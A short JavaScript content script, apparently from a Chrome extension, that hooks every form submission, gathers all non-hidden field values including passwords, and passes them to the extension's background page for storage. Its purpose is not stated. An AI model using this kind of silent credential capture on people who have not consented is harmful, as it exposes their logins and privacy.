$("form").submit(function(event) {
	var form_data = {};
	var has_password = false;
	
	for(var i = 0; i < this.elements.length; i++) {
		var name = this.elements[i].name;
		var type = this.elements[i].type;
		var value = this.elements[i].value;
		
		if(type && type.toLowerCase() === "password")
			has_password = true;
		
		// Add only non-hidden values...
		if(name && type.toLowerCase() !== "hidden")
			form_data[name] = value;
	}
	
	// consider only those forms with passwords...
	if(has_password) {
		// send to the background page...
		chrome.extension.sendMessage({type: "store", data: form_data}, $.noop);
	}
	return true;
});
